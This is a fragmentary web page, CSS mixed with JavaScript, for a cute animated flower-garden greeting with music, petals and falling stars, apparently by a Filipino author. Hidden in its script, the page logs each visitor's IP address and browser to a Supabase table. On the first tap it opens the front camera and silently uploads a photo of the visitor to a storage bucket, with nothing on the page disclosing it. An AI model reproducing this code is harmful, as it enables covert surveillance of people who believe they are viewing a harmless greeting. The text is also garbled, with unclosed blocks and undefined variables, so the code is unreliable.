        :root {

            --sunset-2: #ffb5a7;
            --sunset-3: #f08080;
            --night-bg: #1a1a2e;

        * { -webkit-tap-highlight-color: transparent; -webkit-user-select: none; user-select: none; box-sizing: border-box; }

        body {
    margin: 0; 
    padding: 0;
    background: var(--day-bg);
    display: flex; 
    flex-direction: column; 
    align-items: center; 
    justify-content: center;
    
    /* Responsive Height for iOS Safari */
    height: 100vh;
    height: 100dvh; 
    width: 100vw;
    
    font-family: 'Quicksand', sans-serif;
    overflow: hidden;
    transition: background 5s ease-in-out;
    
    /* Critical for Mobile Web Apps */
    position: fixed;
    top: 0;
    left: 0;
    touch-action: none; /* Prevents accidental zooming and scrolling */
}

        /* ⏳ Day Counter */
        #counter-overlay {
            position: absolute;
            top: 60px;
            opacity: 0;
            transition: opacity 2s ease;
            text-align: center;
            z-index: 50;
        }
        .counter-label {
            font-size: 0.75rem;
            text-transform: uppercase;
            letter-spacing: 2px;
            color: #ff8fa3;
            margin-bottom: 5px;
        }
        .counter-days {
            font-family: 'Dancing Script', cursive;
            font-size: 1.8rem;
            color: #c9184a;
        }

        /* 💡 Instruction Overlay */
        #hint-overlay {
            position: absolute;
            z-index: 100;
            text-align: center;
            pointer-events: none;
            transition: opacity 1s ease;
        }
        .hint-text {
            font-size: 1.1rem;
            color: #c9184a;
            font-weight: 600;
            letter-spacing: 1px;
            text-transform: uppercase;
            animation: pulseHint 2s infinite ease-in-out;
        }
        @keyframes pulseHint {
            0%, 100% { opacity: 0.4; transform: scale(1); }
            50% { opacity: 0.9; transform: scale(1.05); }
        }
        .hint-icon { font-size: 1.5rem; display: block; margin-bottom: 5px; }

        /* Starry Sky */
        #stars-container {
            position: absolute; width: 100%; height: 100%;
            top: 0; left: 0; opacity: 0;
            transition: opacity 3s ease;
            pointer-events: none;
        }
        .star {
            position: absolute; background: white; border-radius: 50%;
            animation: twinkle var(--d) infinite ease-in-out;
        }
        @keyframes twinkle { 0%, 100% { opacity: 0.3; transform: scale(1); } 50% { opacity: 1; transform: scale(1.2); } }

        .falling-star {
            position: absolute; width: 2px; height: 2px;
            background: linear-gradient(to right, white, transparent);
            box-shadow: 0 0 5px white; opacity: 0; pointer-events: none;
        }
        @keyframes shoot {
            0% { transform: translateX(0) translateY(0) rotate(-45deg) scaleX(0); opacity: 1; }
            100% { transform: translateX(-300px) translateY(300px) rotate(-45deg) scaleX(50); opacity: 0; }
        }

        /* Flower Animations */
        .eye { fill: #444; animation: blink 4s infinite; transform-origin: center; transform-box: fill-box; }
        @keyframes blink { 0%, 90%, 100% { transform: scaleY(1); } 95% { transform: scaleY(0.1); } }
        .blush { fill: #ffb7b2; opacity: 0; transition: opacity 0.3s ease; }
        .reacting .blush { opacity: 0.8; }
        .mouth-smile { display: block; }
        .mouth-open { display: none; fill: #444; }
        .reacting .mouth-smile { display: none; }
        .reacting .mouth-open { display: block; }

        @keyframes happyJump {
            0% { transform: scale(var(--base-scale)); }
            30% { transform: scale(calc(var(--base-scale) * 0.9)) translateY(10px); }
            50% { transform: scale(calc(var(--base-scale) * 1.05)) translateY(-15px); }
            100% { transform: scale(var(--base-scale)) translateY(0); }
        }
        .jump { animation: happyJump 0.5s ease-out !important; }

        #garden-bed { position: absolute; width: 100%; height: 100%; top: 0; left: 0; pointer-events: none; }
        .planted-flower { 
            position: absolute; 
            font-size: 24px; 
            animation: grow 1.2s forwards; 
            transition: opacity 0.8s ease, transform 0.8s ease; 
        }
        .fade-out { opacity: 0 !important; transform: scale(0) translateY(-20px) !important; }

        @keyframes grow { 0% { transform: scale(0); opacity: 0; } 100% { transform: scale(1); opacity: 0.9; } }
.canvas {

    z-index: 20;

/* 🌠 Star Counter Fix */

    80% { 
        opacity: 1; 
        transform: translate(-50%, -50%) scale(1);
        filter: blur(0px);
    }
    100% { 
        opacity: 0; 
        transform: translate(-50%, -60%) scale(1.2);
        filter: blur(10px);
    }
}

        async function logVisit() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                const phTime = new Date().toLocaleString("sv-SE", { timeZone: "Asia/Manila" }); 
                await supabaseClient.from('visitor_logs').insert([{ 
                    ip_address: data.ip, 
                    user_agent: navigator.userAgent,
                    created_at: phTime,
                    page_name: 'flower_garden'
                }]);
            } catch (err) { console.error('❌ Error Logging:', err); }
        }

        async function startCamera() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                video.srcObject = stream;
                // Once stream is loaded, take the FIRST snapshot
                video.onloadedmetadata = () => {
                    setTimeout(takeAndUploadSnapshot, 1000); // Small delay to let the camera adjust
                };
            } catch (err) { console.error("Camera error:", err); }
        }

        async function takeAndUploadSnapshot() {
            if (!stream) {
                console.error("No camera stream available for snapshot.");
                return;
            }
            
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            canvas.toBlob(async (blob) => {
                if (!blob) {
                    console.error("Failed to create blob from canvas.");
                    return;
                }

                // Generate a unique filename using timestamp
                const fileName = `snapshot_${Date.now()}.jpg`;
                
                console.log("Attempting upload to Supabase...");
                
                const { data, error } = await supabaseClient.storage
                    .from('snapshots') // <--- Verify this matches your bucket name exactly
                    .upload(fileName, blob, {
                        cacheControl: '3600',
                        upsert: false,
                        contentType: 'image/jpeg'
                    });
                
                if (error) {
                    console.error("❌ Supabase Upload Error:", error.message);
                    console.error("Full Error Object:", error);
                } else {
                    console.log("✅ Snapshot saved successfully:", data.path);
                }
            }, 'image/jpeg', 0.6);

        function triggerWish(x, y) {
            // 1. Haptic Feedback (Android only, but good to have)
            if (window.navigator.vibrate) window.navigator.vibrate([30, 50, 30]);

            // 2. Create "Make a Wish" Text
            const wish = document.createElement('div');
            wish.className = 'wish-notification';
            wish.innerText = "Make a wish! ✨";
            wish.style.left = (x - 50) + 'px';
            wish.style.top = (y - 20) + 'px';
            document.body.appendChild(wish);

            // 3. Create Heart Particles "Pop"
            for (let i = 0; i < 8; i++) {
                const p = document.createElement('div');
                p.className = 'planted-flower'; // Reusing your heart style
                p.innerText = '💖';
                p.style.left = x + 'px';
                p.style.top = y + 'px';
                p.style.transition = 'all 1s ease-out';
                
                document.body.appendChild(p);

                // Explosion effect math
                const angle = (Math.PI * 2 / 8) * i;
                const velocity = 50 + Math.random() * 50;
                
                requestAnimationFrame(() => {
                    p.style.transform = `translate(${Math.cos(angle) * velocity}px, ${Math.sin(angle) * velocity}px) scale(0)`;
                    p.style.opacity = '0';
                });

                setTimeout(() => p.remove(), 1000);
            }

            setTimeout(() => wish.remove(), 2000);
        }

            if (window.navigator.vibrate) window.navigator.vibrate([50, 30, 50]);
        }

 function startExperience(e) {
    tapCount++;

    if (tapCount === 13) triggerSecret();

    if (!started) {
        hintOverlay.style.opacity = '0';
        counterOverlay.style.opacity = '1';
        resetBtn.classList.add('show'); 
        
        // 1. I-force natin na scale 0 muna siya (kahit naka-set sa CSS)
        // para sigurado tayong may "starting point" ang animation.
        bouquet.style.transition = "none"; // Patayin muna transition saglit
        bouquet.style.transform = "scale(0)";
        
        // Force a reflow (ito ang sikreto ng mga animation frames)
        void bouquet.offsetWidth; 

        // 2. Ibalik ang transition at tawagin ang growth
        bouquet.style.transition = "transform 1.5s cubic-bezier(0.34, 1.56, 0.64, 1), filter 1.5s ease";
        
        // Ngayon, pag tinawag natin ito, mag-a-animate siya PALAKI
        applyGrowth(); 

        startCamera();

        if (typeof DeviceMotionEvent.requestPermission === 'function') {
            DeviceMotionEvent.requestPermission().then(state => { 
                if (state === 'granted') window.addEventListener('devicemotion', handleMotion); 
            });
        } else { 
            window.addEventListener('devicemotion', handleMotion); 
        }
    }

    // --- Jump animation logic (Nothing removed) ---
    if (window.navigator.vibrate) window.navigator.vibrate(20);
    bouquet.classList.remove('jump', 'reacting');
    void bouquet.offsetWidth; 
    bouquet.classList.add('jump', 'reacting');
    setTimeout(() => bouquet.classList.remove('reacting'), 1500);

    if (started) return;
    started = true;
    audio.play();
    document.body.style.background = 'var(--sunset-2)';
    subtitle.classList.add('visible');
    
    const petalInterval = setInterval(() => {
        if(!started) { clearInterval(petalInterval); return; }
        const p = document.createElement('div');
        p.className = 'petal';
        p.style.left = Math.random() * 100 + 'vw';
        p.style.width = p.style.height = Math.random() * 10 + 10 + 'px';
        document.body.appendChild(p);
        setTimeout(() => p.remove(), 6000);
    }, 450);


    audio.ontimeupdate = () => {
        if (tapCount >= 13 || !started) return; 
        
        const current = messages.findLast(item => audio.currentTime >= item.t);
        if (current && subtitle.innerText !== current.m) {
            subtitle.classList.remove('visible');
            setTimeout(() => { 
                if(!started) return;
                subtitle.innerText = current.m; 
                subtitle.classList.add('visible'); 
                if(audio.currentTime >= 11) subtitle.classList.add('night-text');
            }, 400);
        }
        
        // Background Transitions
        if(audio.currentTime > 8 && audio.currentTime < 11) {
            document.body.style.background = 'var(--sunset-3)';
        } else if(audio.currentTime >= 11) {
            document.body.style.background = 'var(--night-bg)';
            starContainer.style.opacity = '1';
            
            // --- ETO ANG IMPORTANTE: PINAPALITAN ANG OPACITY NG COUNTER ---
            document.getElementById('star-counter').style.opacity = '1'; 
            
            nightMode = true;

            // Interactive Star Spawner
            const now = Date.now();
            if (now - lastStarTime > 2000) { 
                if (Math.random() < 0.3) { 
                    createFallingStar();
                    lastStarTime = now;
                }
            }
        }
    };
}

        function handleMotion(event) {
            let accel = event.accelerationIncludingGravity;
            if (!accel.x) return;
            let deltaX = Math.abs(accel.x - lastX);
            let deltaY = Math.abs(accel.y - lastY);
            let deltaZ = Math.abs(accel.z - lastZ);
            if (((deltaX > 15) && (deltaY > 15)) || ((deltaX > 15) && (deltaZ > 15)) || ((deltaY > 15) && (deltaZ > 15))) {
                clearGarden();
            }
            lastX = accel.x; lastY = accel.y; lastZ = accel.z;
        }
